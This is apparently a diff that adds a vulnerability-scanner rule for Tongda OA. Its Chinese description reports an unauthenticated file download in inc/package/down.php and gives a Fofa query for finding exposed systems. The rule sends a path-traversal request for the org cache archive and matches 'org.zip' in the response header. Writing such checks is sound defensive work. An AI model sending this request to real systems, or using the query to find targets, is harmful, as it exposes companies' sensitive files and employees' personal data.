@@ -1,0 +1,23 @@
+id: tongda-down-php-unauthorized-access
+
+info:
+  name: 通达OA down.php存在未授权访问漏洞
+  author: Y3y1ng
+  severity: high
+  verified: true
+  description: |-
+    通达OA（Office Anywhere网络智能办公系统） inc/package/down.php 接口存在未授权访问漏洞，通过此漏洞攻击者构造特殊链接，下载敏感文件，获取企业员工个人信息。
+    Fofa: app="TDXK-通达OA"
+  reference:
+    - https://mp.weixin.qq.com/s/YiPk8YRzgLEdwVWA-F-4XA
+  tags: tongda
+  created: 2023/12/04
+rules:
+  r0:
+    request:
+      method: GET
+      path: /inc/package/down.php?id=../../../cache/org
+    expression: |
+      response.status == 200 && 
+      response.raw_header.bcontains(b'org.zip')
+expression: r0()
